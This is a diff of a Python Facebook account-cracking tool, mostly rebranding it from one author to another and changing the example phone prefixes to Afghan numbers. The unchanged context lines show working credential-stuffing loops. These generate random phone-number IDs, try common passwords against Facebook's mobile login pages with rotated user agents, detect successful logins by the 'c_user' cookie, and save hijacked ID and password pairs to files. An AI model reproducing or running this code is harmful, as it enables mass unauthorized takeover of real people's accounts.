@@ -185,18 +185,18 @@ syed =[
 'Mozilla/5.0 (Linux; Android 10; CPH2067 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36',]
 logo = """
           \033[1;97m
-$$\   $$\  $$$$$$\  $$$$$$$$\ $$$$$$$\   $$$$$$\ $$$$$$$$\ 
-\033[1;37m$$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\\__$$  __|
-\033[1;32m$$ |  $$ |$$ /  $$ |    $$  / $$ |  $$ |$$ /  $$ |  $$ |   
-\033[1;32m$$$$$$$$ |$$$$$$$$ |   $$  /  $$$$$$$  |$$$$$$$$ |  $$ |   
-\033[1;32m$$  __$$ |$$  __$$ |  $$  /   $$  __$$< $$  __$$ |  $$ |   
-\033[1;39m$$ |  $$ |$$ |  $$ | $$  /    $$ |  $$ |$$ |  $$ |  $$ |   
-\033[1;39m$$ |  $$ |$$ |  $$ |$$$$$$$$\ $$ |  $$ |$$ |  $$ |  $$ |   
-\033[1;39m\__|  \__|\__|  \__|\________|\__|  \__|\__|  \__|  \__|   
+\033[1;37m 8888888b.   .d8888b.  888    888 
+\033[1;37m 888   Y88b d88P  Y88b 888    888 
+\033[1;32m 888    888 Y88b.      888    888 
+\033[1;32m 888   d88P  "Y888b.   8888888888 
+\033[1;32m 8888888P"      "Y88b. 888    888 
+\033[1;39m 888 T88b         "888 888    888 
+\033[1;39m 888  T88b  Y88b  d88P 888    888 
+\033[1;39m 888   T88b  "Y8888P"  888    888 
 [+]═══════════════════════════════════════════
-\033[1;37m[+] \033[1;37mCREATED BY   :  \033[1;37mMR.HaZraToO
-\033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37mMR.HaZraToO
-\033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37mHaZraToO-143
+\033[1;37m[+] \033[1;37mCREATED BY   :  \033[1;37mRaziqullah saadat
+\033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37mRaziqullah saadat
+\033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37mRaziq-saadat
 \033[1;37m[+] \033[1;37mTOOL STATUS  :  \033[1;37mFREE
 \033[1;37m[+] \033[1;37mTOOL VIRSION :  \033[1;31m4.0.8
 \x1b[1;97m[+]═══════════════════════════════════════════"""
@@ -210,9 +210,9 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print('[1] START RANDOM CARACK M [1]FOR AFGHANISTAN') 
-	print('[2] START RANDOM CARACK M [2]FORM RAFI ULLAH') 
-	print('[3] START RANDOM CARACK M [3]FORM AFG KING') 
-	print('[4] START RANDOM CARACK M [4]FORM HAZRAT') 
+	print('[2] START RANDOM CARACK M [2]Random clone') 
+	print('[3] START RANDOM CARACK M [3]FORM Saadat') 
+	print('[4] START RANDOM CARACK M [4]FORM All country') 
 	print('[5] START RANDOM CARACK M [5]FOR PAKISTAN') 
 	print('[6] START RANDOM CARACK M [1] FOR INDIA') 
 	print('[+]═══════════════════════════════════════════')
@@ -238,7 +238,7 @@ def random_number1():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :9318,9345,9323,9306.ETC')
+	print('[√] EXAMPLE :9370,9379,9377,9378.ETC')
 	print('[+]═══════════════════════════════════════════')
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	limit = int(input('[+]How many numbers do you want to add ? '))
@@ -268,7 +268,7 @@ def random_number2():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :9318,92345,9323,92306.ETC')
+	print('[√] EXAMPLE :9370,9379,9377,9378.ETC')
 	print('[+]═══════════════════════════════════════════')
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	limit = int(input('[+]How many numbers do you want to add ? '))
@@ -298,7 +298,7 @@ def random_number6():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :91****,91***,91*****,91****.ETC')
+	print('[√] EXAMPLE :93****,93***,93*****,93****.ETC')
 	print('[+]═══════════════════════════════════════════')
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	limit = int(input('[+]How many numbers do you want to add ? '))
@@ -333,7 +333,7 @@ def mcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;97mMR.HaZraToO\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
+			sys.stdout.write(f'\r [\033[1;97mSaadat\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://m.facebook.com').text
@@ -369,7 +369,7 @@ def mcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\033[1;32m')
+				print('\033[1;92m[Saadat-OK] '+cid+' | '+ps+'\033[1;32m')
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 				oks.append(cid) 
 				break
@@ -389,7 +389,7 @@ def random_number3():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[√] EXAMPLE :9370,9379,9377,9378.ETC')
 	print('[+]═══════════════════════════════════════════')
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	limit = int(input('[+]How many numbers do you want to add ? '))
@@ -419,7 +419,7 @@ def random_number4():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[√] EXAMPLE :9370,9379,9377,9378.ETC')
 	print('[+]═══════════════════════════════════════════')
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	limit = int(input('[+]How many numbers do you want to add ? '))
@@ -448,7 +448,7 @@ def random_number5():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+	print('[√] EXAMPLE :9370,9379,9377,9378.ETC')
 	print('[+]═══════════════════════════════════════════')
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	limit = int(input('[+]How many numbers do you want to add ? '))
@@ -480,7 +480,7 @@ def fcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;97mMR.HaZraToO\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
+			sys.stdout.write(f'\r [\033[1;97mSaadat\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -509,14 +509,14 @@ def fcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\033[1;32m')
+				print('\033[1;92m[Saadat-OK] '+cid+' | '+ps+'\033[1;32m')
 				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\33[0;97m')
+				print('\33[1;91m[Saadat-CP] '+cid+' | '+ps+'\33[0;97m')
 				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
@@ -563,7 +563,7 @@ def mbcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;92mMR.HaZraToO\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
+			sys.stdout.write(f'\r [\033[1;92mSaadat\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(syed)
 			free_fb = session.get('https://mbasic.facebook.com').text
